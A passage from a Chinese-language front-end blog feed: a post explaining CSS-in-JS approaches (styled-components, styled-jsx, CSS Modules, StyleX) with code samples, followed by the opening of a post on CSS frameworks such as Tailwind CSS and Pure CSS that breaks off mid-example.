        <content type="html"><![CDATA[<h2 id="什麼是-CSS-in-JS"><a href="#什麼是-CSS-in-JS" class="headerlink" title="什麼是 CSS in JS"></a>什麼是 CSS in JS</h2><p>CSS in JS 解決了 CSS 命名的問題。</p><p>由於 component-based 的概念興起元件開發成為顯學，CSS in JS 提供了將樣式寫在元件中解決方案，也讓 CSS 需要從寫程式語言的角度去進行架構設計。</p><p>CSS in JS 不僅降低了維護難度也加速了開發速度，減少檔案切換和減少 class 命名錯誤等等問題，常見的 library 像是 css module、vanilla-extract、styled-components、styled-jsx (Next.js) 都非常好上手，更完整的將元件模組化並增加可重用性。</p><p>CSS in JS 缺點也要先說在前面，當需要 Server Render 時，相關的效能問題也需要一併考慮進去。</p><p>CSS in JS 像是把需要打扮的道具跟裝備直接跟使用的情境整合在一起，像是約會必勝穿搭、適合上班的裝容等等，在遇到相關情境時能夠輕鬆應對。</p><h3 id="問題定義"><a href="#問題定義" class="headerlink" title="問題定義"></a>問題定義</h3><ul><li>當元件在其他專案使用時，搬動除了必須搬完相對應的樣式檔，還必須放在正確的位置</li><li>在專案最佳化時，樣式檔的引用順序須讓機器不會混淆，若將樣式檔拆太細，很可能發生 Code Splitting 時順序錯誤</li></ul><h3 id="優點與解決的問題"><a href="#優點與解決的問題" class="headerlink" title="優點與解決的問題"></a>優點與解決的問題</h3><ul><li>解決 code spliting 可能出現的順序問題</li><li>解決命名互相覆蓋，在撰寫樣式檔時也可以用 BEM 的命名規則避開或導入<a href="/2022/09/07/relationships-between-frontend-and-backend/css-design-pattern-with-bem-smacss-oocss-atomic-css/?utm_source=link&utm_medium=article&utm_campaign=internal_link">原子化樣式設計</a></li><li>維護時不需要再去找到底被哪個樣式檔影響</li></ul><h3 id="缺點"><a href="#缺點" class="headerlink" title="缺點"></a>缺點</h3><ul><li>RWD 不像 bootstrap 有格線系統那樣使用方便，所以可以額外導入 CSS 框架的格線系統混合使用</li><li>較難做效果跟做覆蓋，不同狀態需要不同樣式時要再封裝一層</li><li>語法的高亮、自動完成、防呆較不完整</li><li>少了可以共用樣式的好處，像是 <code>@extend</code> 或 <code>@mixin</code> 這樣的寫法，需把元件切的夠小，才會有一定程度的共用性</li></ul><h2 id="styled-components"><a href="#styled-components" class="headerlink" title="styled-components"></a>styled-components</h2><p>styled-components 提供了在 JavaScript 中直接撰寫 CSS 的介面，意味著可以使用所有的 CSS 功能，切換主視覺要多用一個 <code>&lt;ThemeProvider&gt;</code>，傳入的 Props 差異太大時有點麻煩</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> styled <span class="keyword">from</span> <span class="string">&quot;styled-components&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Sample</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">StyledButton</span> = styled.<span class="property">button</span><span class="string">`</span></span><br><span class="line"><span class="string">    color: #ffffff;</span></span><br><span class="line"><span class="string">    font-size: 20px;</span></span><br><span class="line"><span class="string">    border-radius: 5px;</span></span><br><span class="line"><span class="string">  `</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">StyledButton</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>按鈕<span class="tag">&lt;/<span class="name">StyledButton</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="套用主視覺配置"><a href="#套用主視覺配置" class="headerlink" title="套用主視覺配置"></a>套用主視覺配置</h3><p>styled-components 也提供了主視覺的配置，透過 styled-components 提供的 ThemeProvider 在外層注入就可以在元件中直接取值。</p><ol><li>ThemeProvider 在外層注入視覺配置</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ThemeProvider</span> &#125; <span class="keyword">from</span> <span class="string">&quot;styled-components&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> colors = &#123;</span><br><span class="line">  <span class="attr">primary</span>: <span class="string">&quot;#c18e00&quot;</span>,</span><br><span class="line">  <span class="attr">secondary</span>: <span class="string">&quot;#0086ff&quot;</span>,</span><br><span class="line">  <span class="attr">dark</span>: <span class="string">&quot;rgba(0, 0, 0, 0.6)&quot;</span>,</span><br><span class="line">  <span class="attr">muted</span>: <span class="string">&quot;rgba(0, 0, 0, 0.3)&quot;</span>,</span><br><span class="line">  <span class="attr">light</span>: <span class="string">&quot;rgba(0, 0, 0, 0.18)&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fontSizes = &#123;</span><br><span class="line">  <span class="attr">xl</span>: <span class="string">`<span class="subst">$&#123;<span class="number">1.875</span> * base&#125;</span>rem`</span>,</span><br><span class="line">  <span class="attr">lg</span>: <span class="string">`<span class="subst">$&#123;<span class="number">1.375</span> * base&#125;</span>rem`</span>,</span><br><span class="line">  <span class="attr">md</span>: <span class="string">`<span class="subst">$&#123;<span class="number">1.25</span> * base&#125;</span>rem`</span>,</span><br><span class="line">  <span class="attr">base</span>: <span class="string">`<span class="subst">$&#123;<span class="number">1</span> * base&#125;</span>rem`</span>,</span><br><span class="line">  <span class="attr">sm</span>: <span class="string">`<span class="subst">$&#123;<span class="number">0.875</span> * base&#125;</span>rem`</span>,</span><br><span class="line">  <span class="attr">xs</span>: <span class="string">`<span class="subst">$&#123;<span class="number">0.75</span> * base&#125;</span>rem`</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> theme = &#123;</span><br><span class="line">  colors,</span><br><span class="line">  fontSizes,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyApp</span> <span class="keyword">extends</span> <span class="title class_ inherited__">App</span> &#123;</span><br><span class="line">  <span class="title function_">componentDidMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">objectFitImages</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; <span class="title class_">Component</span>, pageProps, reduxStore &#125; = <span class="variable language_">this</span>.<span class="property">props</span>;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">ThemeProvider</span> <span class="attr">theme</span>=<span class="string">&#123;theme&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Provider</span> <span class="attr">store</span>=<span class="string">&#123;reduxStore&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Component</span> &#123;<span class="attr">...pageProps</span>&#125; /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">Provider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ThemeProvider</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>在元件中直接取值，甚至可以寫 Function 進行判斷，做出更多元的變化</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">StyleWrapper</span> = styled.<span class="property">div</span><span class="string">`</span></span><br><span class="line"><span class="string">  background: <span class="subst">$&#123;(&#123; color, reverse, theme: &#123; colors &#125; &#125;) =&gt;</span></span></span><br><span class="line"><span class="subst"><span class="string">    reverse ? colors[color] : <span class="string">&quot;none&quot;</span>&#125;</span>;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">TestMessage</span>(<span class="params">&#123; color, reverse, message &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">StyleWrapper</span> <span class="attr">color</span>=<span class="string">&#123;color&#125;</span> <span class="attr">reverse</span>=<span class="string">&#123;reverse&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;message&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">StyleWrapper</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RWD"><a href="#RWD" class="headerlink" title="RWD"></a>RWD</h3><p>由於 styled-components 提供了 function 的撰寫模式，所以即使撰寫 RWD 的元件也很簡單。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getWidthString</span>(<span class="params">span</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> result;</span><br><span class="line">  <span class="keyword">if</span> (span) &#123;</span><br><span class="line">    result = <span class="string">`width: <span class="subst">$&#123;(span / <span class="number">12</span>) * <span class="number">100</span>&#125;</span>%`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Column</span> = styled.<span class="property">div</span><span class="string">`</span></span><br><span class="line"><span class="string">  float: left;</span></span><br><span class="line"><span class="string">  width: 100%;</span></span><br><span class="line"><span class="string">  /* stylelint-disable value-keyword-case */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;(&#123; xs &#125;) =&gt; (xs ? getWidthString(xs) : <span class="string">&quot;width: 100%&quot;</span>)&#125;</span>;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  @media only screen and (min-width: 768px) &#123;</span></span><br><span class="line"><span class="string">    <span class="subst">$&#123;(&#123; sm &#125;) =&gt; sm &amp;&amp; getWidthString(sm)&#125;</span>;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  @media only screen and (min-width: 992px) &#123;</span></span><br><span class="line"><span class="string">    <span class="subst">$&#123;(&#123; md &#125;) =&gt; md &amp;&amp; getWidthString(md)&#125;</span>;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  @media only screen and (min-width: 1200px) &#123;</span></span><br><span class="line"><span class="string">    <span class="subst">$&#123;(&#123; lg &#125;) =&gt; lg &amp;&amp; getWidthString(lg)&#125;</span>;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure><h2 id="styled-jsx"><a href="#styled-jsx" class="headerlink" title="styled-jsx"></a>styled-jsx</h2><p>styled-jsx 則是 Next.js 內建支援的介面，基礎的功能也是差不多，就是寫法上稍微不太相同。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Sample</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">style</span> <span class="attr">jsx</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        &#123;`</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">          <span class="selector-tag">button</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">            <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">            <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        `&#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>按鈕<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>global 的樣式，RWD 之類的就可以訂在這邊。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="title function_">default</span> () =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">jsx</span> <span class="attr">global</span>&gt;</span><span class="language-css">&#123;`</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="selector-tag">body</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">background</span>: red;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    `&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>動態的寫法，跟 styled-components 可以做到判斷，但又沒有 function 那麼彈性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Button</span> = (<span class="params">props</span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    Hello</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">jsx</span>&gt;</span><span class="language-css">&#123;`</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="selector-tag">button</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">padding</span>: $&#123;&quot;large&quot; in props ? &quot;<span class="number">50</span>&quot; : <span class="string">&quot;20&quot;</span>&#125;px;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">background</span>: $&#123;props<span class="selector-class">.theme</span><span class="selector-class">.background</span>&#125;;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    `&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="CSS-Modules"><a href="#CSS-Modules" class="headerlink" title="CSS Modules"></a>CSS Modules</h2><p>CSS Modules 是用來解決 CSS 重複命名需要時常處理衝突的問題，在 Create React App 中 CSS 命名規則為 <code>&#123;檔名&#125;.module.css</code>。</p><p>main.module.css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.information</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>page.module.css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.information</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> styleMain <span class="keyword">from</span> <span class="string">&quot;./main.module.css&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> stylePage <span class="keyword">from</span> <span class="string">&quot;./page.module.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span> <span class="attr">className</span>=<span class="string">&#123;styleMain.information&#125;</span>&gt;</span>App<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h3</span> <span class="attr">className</span>=<span class="string">&#123;stylePage.information&#125;</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Class 的命名用駝峰式會較佳，但沒有一定。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">style[<span class="string">&quot;class-name&quot;</span>];</span><br><span class="line">style.<span class="property">className</span>;</span><br></pre></td></tr></table></figure><h2 id="StyleX"><a href="#StyleX" class="headerlink" title="StyleX"></a>StyleX</h2><p>Facebook 推出的 Atomic CSS in JS 解決方案 StyleX 上線啦!</p><p>透過 Build Time 就處理好的樣式效能海放 Run Time 的 Styled Component 同時也減少了要背一堆框架內建的 Util CSS 語法值得肯定。</p><p>API 也非常單純主要就是兩個</p><ul><li>stylex.create: 產生樣式</li><li>stylex.props: 把樣式套用到元件</li></ul><p>底下是官方最基本的範例:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> styles = stylex.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">red</span>: &#123; <span class="attr">color</span>: <span class="string">&quot;red&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">let</span> a = stylex.<span class="title function_">props</span>(styles.<span class="property">red</span>);</span><br></pre></td></tr></table></figure><p>經過編譯後，會自動產生出來一個動態的 class 以及對應的樣式，完整的解決了命名問題並同時提供原子化樣式的優點，大量的降低網站樣式的流量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123; <span class="attr">className</span>: <span class="string">&quot;x1e2nbdu&quot;</span> &#125;;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.x1e2nbdu</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>雖然是 facebook 推出的但由於主要是透過兩個 function 來產生出樣式，所以可以直接套用在其他的框架也是沒有問題。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> CSS </tag>
            
            <tag> React.js </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 框架用了什麼設計模式</title>
      <link href="/2022/09/09/relationships-between-frontend-and-backend/css-framework/"/>
      <url>/2022/09/09/relationships-between-frontend-and-backend/css-framework/</url>
      
        <content type="html"><![CDATA[<p>小編曾介紹過 <a href="/2022/09/07/relationships-between-frontend-and-backend/css-design-pattern-with-bem-smacss-oocss-atomic-css/?utm_source=link&utm_medium=article&utm_campaign=internal_link">CSS 的設計模式</a>，這篇就讓小編開箱那些年小編曾體驗過的 CSS 主流框架:</p><ul><li>Tailwind CSS</li><li>PureCSS</li><li>Bootstrap</li><li>animate.css</li></ul><p>大家在寫 CSS 的過程，應該都會經歷幾個階段:</p><ol><li>都不太會寫，先找個大家常用的套件 &#x3D;&gt; 你寫的網站好 Bootstrap</li><li>開始用一些原生的寫法，寫著寫著就變成龐然大物幾千行的程式碼</li><li>開始把 CSS 元件化，將常用的 UI 封裝起來，就是常見的幾套框架像是 bootstrap、element ui、Antd 幫我們做的事情</li><li>使用 CSS 處理器優化開發者體驗</li><li>CSS 原子化</li></ol><p>就好像女孩子剛學化妝的時候</p><ol><li>先看個網美推薦就開始買個套裝組開始塗，可是工具是否用的好，塗上去是否適合都不知道</li><li>接下來就開始東買一個西買一個來試用，桌上堆滿了琳瑯滿目的化妝跟保養品</li><li>各種產品用過一輪後接著開始知道洗澡前後用什麼、睡前用什麼、起床用什麼、出門用什麼</li><li>開始用一些產品取代掉過去使用的</li><li>只買自己需要的</li></ol><h3 id="Tailwind-CSS"><a href="#Tailwind-CSS" class="headerlink" title="Tailwind CSS"></a>Tailwind CSS</h3><blockquote><p>可以不改到 style sheet 避免把東西改壞但還是可以修改畫面的方法</p></blockquote><p>Tailwind CSS 把所有可能會用到的樣式都寫成一個 Class，使用 Tailwind CSS，基本可以不用再寫 css，壞處是 html 標籤的 class 會很長。</p><p>也許有人會說那這包不就很大且一堆功能沒用到? 所以在打包的時候需要使用 <a href="https://purgecss.com/">purge css</a>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">figure</span> <span class="attr">class</span>=<span class="string">&quot;md:flex bg-slate-100 rounded-xl p-8 md:p-0 dark:bg-slate-800&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">class</span>=<span class="string">&quot;w-24 h-24 md:w-48 md:h-auto md:rounded-none rounded-full mx-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;/sarah-dayan.jpg&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">alt</span>=<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">width</span>=<span class="string">&quot;384&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">height</span>=<span class="string">&quot;512&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pt-6 md:p-8 text-center md:text-left space-y-4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">blockquote</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;text-lg font-medium&quot;</span>&gt;</span></span><br><span class="line">        “Tailwind CSS is the only framework that I&#x27;ve seen scale on large teams.</span><br><span class="line">        It’s easy to customize, adapts to any design, and the build size is</span><br><span class="line">        tiny.”</span><br><span class="line">      <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">figcaption</span> <span class="attr">class</span>=<span class="string">&quot;font-medium&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-sky-500 dark:text-sky-400&quot;</span>&gt;</span>Sarah Dayan<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-slate-700 dark:text-slate-500&quot;</span>&gt;</span></span><br><span class="line">        Staff Engineer, Algolia</span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Pure-CSS"><a href="#Pure-CSS" class="headerlink" title="Pure CSS"></a>Pure CSS</h3><blockquote><p>輕量化、簡單、易用</p></blockquote><p>分成了 6 種模組，每個模組都是獨立的 CSS 檔案，可以依需求載入需要的模組，不需要太多工具就可以直接使用的一套 CSS 框架。</p><ol><li>base</li><li>Grids</li><li>Forms</li><li>Buttons</li><li>Tables</li><li>Menus</li></ol><p>可以從原始碼發現結構與樣式分離 (OOCSS)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.pure-button</span> &#123;</span><br><span class="line">  <span class="comment">/* Structure */</span></span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">line-height</span>: normal;</span><br><span class="line">  <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">  <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  -webkit-user-drag: none;</span><br><span class="line">  -webkit-user-<span class="selector-tag">select</span>: none;</span><br><span class="line">  -moz-user-<span class="selector-tag">select</span>: none;</span><br><span class="line">  